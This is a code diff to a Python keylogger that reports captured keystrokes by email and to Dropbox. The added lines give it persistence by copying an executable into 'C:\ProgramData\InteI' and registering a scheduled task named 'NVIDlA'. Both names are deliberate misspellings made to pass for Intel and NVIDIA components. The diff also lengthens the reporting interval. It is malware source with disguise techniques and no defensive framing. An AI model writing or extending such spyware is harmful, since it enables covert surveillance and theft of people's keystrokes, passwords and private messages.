@@ -13,8 +13,12 @@ EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 EMAIL_CC = os.getenv("EMAIL_CC")
 DROPBOX_TOKEN = os.getenv("DROPBOX_TOKEN")
 
-SEND_REPORT_EVERY = 5  # seconds
-MAGIC_WORD = "STOP"
+SEND_REPORT_EVERY = 30  # seconds
+MAGIC_WORD = "stop"
+
+SRC_FILE = "D:\main.exe"
+DEST_FOLDER = "C:\ProgramData\InteI"
+TASK_NAME = "NVIDlA"
 
 
 def main():
@@ -29,6 +33,9 @@ def main():
         cc=EMAIL_CC,
         magic_word=MAGIC_WORD,
         dropbox_token=DROPBOX_TOKEN,
+        src_file = SRC_FILE,
+        dest_folder=DEST_FOLDER,
+        task_name=TASK_NAME,
     )
     keylogger.run()
 
